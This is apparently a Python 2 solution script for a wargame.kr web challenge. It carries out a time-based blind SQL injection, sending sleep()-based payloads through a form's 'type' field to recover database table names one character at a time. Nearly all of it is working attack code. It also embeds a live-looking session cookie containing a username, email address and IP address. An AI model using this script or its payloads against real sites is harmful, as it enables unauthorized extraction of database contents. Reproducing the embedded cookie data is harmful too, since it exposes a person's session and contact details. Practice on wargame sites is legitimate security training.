import requests, time

url = 'http://wargame.kr:8080/qna/?page=to_jsmaster'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'ci_session':'a%3A10%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22b921fba9ee1c36b430dd55a7908875ad%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22222.110.147.52%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F73.0.3683.103+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1555399705%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A7%3A%22noonzib%22%3Bs%3A5%3A%22email%22%3Bs%3A19%3A%22noonzib14%40gmail.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22default%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%225323%22%3B%7D0159aa48846aba1397ac91639bcdb49ef1478f7e'}
table=""
for i in range(1,30):
    for j in range(32,128):
        data = {"cont":"asd","mail":"guest",'type': "1 and if ((select ascii(substr(group_concat(table_name), "+str(i)+", 1)) from information_schema.tables where table_schema = database()) = "+str(j)+", sleep(3), 1)"}
        # 1 and if ((select ascii(substr(group_concat(table_name), 1, 1)) from information_schema.tables where table_schema = database()) > 0, sleep(3), 1)
        time1=time.time()
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        status_code = response.status_code
        html_data = response.text
        print "1 and if ((select ascii(substr(group_concat(table_name),"+str(i)+",1)) from information_schema.tables where table_schema=database())="+str(j)+",sleep(2),1"
        time2=time.time()
        if (time2-time1>2):
            print "[+]find : " + chr(j)
            table+=chr(j)
            break
print "[*]End"
print "[+]Table Name is " + table
# table_name : authkey,message

